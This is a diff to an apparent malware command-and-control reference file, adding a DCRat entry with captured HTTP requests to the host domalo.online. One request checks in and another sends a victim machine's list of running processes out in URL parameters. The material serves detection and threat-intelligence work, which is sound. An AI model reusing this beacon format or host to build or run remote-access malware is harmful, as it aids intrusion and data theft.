@@ -113,6 +113,21 @@ Content-Type: text/html; charset=UTF-8
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkrat.png "Darkrat")
 
+#### DCRat
+~~~
+GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/56743785cf97084d3a49a8bf0956f2c744a4a3e0.php?data=active
+
+HTTP/1.1
+Host: domalo.online
+Connection: Keep-Alive
+
+GET /ksezblxlvou3kcmbq8l7hf3f4cy5xgeo4udla91dueu3qa54/46kqbjvyklunp1z56txzkhen7gjci3cyx8ggkptx25i74mo6myqpx9klvv3/akcii239myzon0xwjlxqnn3b34w/212bad81b4208a2b412dfca05f1d9fa7.php?type=__ds_setdata&__ds_setdata_user=552b13e67562d7b564b8a0ac9f35c735d17c786b&__ds_setdata_ext=2dce65292845e5dbc41d772bf7f1866e&__ds_setdata_data=%3CSTR%3Esmss.exe%3CSTR%3Esvchost.exe%3CSTR%3Ewinlogon.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Ecsrss.exe%3CSTR%3Esvchost.exe%3CSTR%3Elsm.exe%3CSTR%3Eqemu-ga.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Eexplorer.exe%3CSTR%3ESearchProtocolHost.exe%3CSTR%3Elsass.exe%3CSTR%3Ectfmon.exe%3CSTR%3Edwm.exe%3CSTR%3Ecsrss.exe%3CSTR%3Esvchost.exe%3CSTR%3Eservices.exe%3CSTR%3EWmiPrvSE.exe%3CSTR%3Ewininit.exe%3CSTR%3Espoolsv.exe%3CSTR%3Efsdffc.exe%3CSTR%3ESearchIndexer.exe%3CSTR%3ESearchFilterHost.exe%3CSTR%3Ewindanr.exe%3CSTR%3Esvchost.exe%3CSTR%3Esvchost.exe%3CSTR%3Etaskeng.exe%3CSTR%3ESystem.exe%3CSTR%3Esvchost.exe%3CSTR%3EIdle.exe 
+
+HTTP/1.1
+Host: domalo.online
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dcrat.png "DCRat")
+
 #### Emotet
 ~~~
 POST /mult/tlb/ HTTP/1.1
